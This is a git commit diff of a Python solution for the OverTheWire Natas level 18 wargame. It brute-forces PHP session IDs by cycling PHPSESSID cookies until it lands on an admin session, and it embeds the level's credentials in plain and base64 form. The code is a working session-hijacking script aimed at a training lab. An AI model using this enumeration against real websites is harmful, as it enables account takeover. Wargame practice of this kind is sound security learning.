fb7f478d5cd69bad972d56f1c779190beb8e9fc1
Robert Kovacs <robert.kovacs.centacc@gmail.com>
2019-10-07 19:56:29 +0200

    natas #19

--- overthewire/natas/n18.py
+++ overthewire/natas/n18.py
@@ -2,22 +2,19 @@ import requests
 import sys
 
 url = "http://natas18.natas.labs.overthewire.org"
-user = "natas18"
-password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"
 magic_content = "You are an admin"
 wrong_conent = "You are logged in as a regular user"
-counter = 0
 
-while True:
-    resp = requests.post(url, data={"username": "natas19", "password": "pass"}, auth=(user, password))
-    #print('cookie: ' + resp.cookies['PHPSESSID'])
+for i in range(700):
+    payload = {"username": "admin", "password": "pass"}
+    headers = {"Cookie": "PHPSESSID={0}".format(i), "Authorization": "Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA=="}
+    resp = requests.post(url, params=payload, headers=headers)
     if magic_content in resp.content:
         print("Solved: " + resp.content)
         sys.exit()
     elif wrong_conent in resp.content:
-        counter += 1
-        if counter % 20 == 0:
-            print("Trying for the " + str(counter) + ". times")
+        if i % 20 == 0:
+            print("Trying for the " + str(i) + ". times")
     else:
         print("Failed to solved: " + resp.content)
         sys.exit()
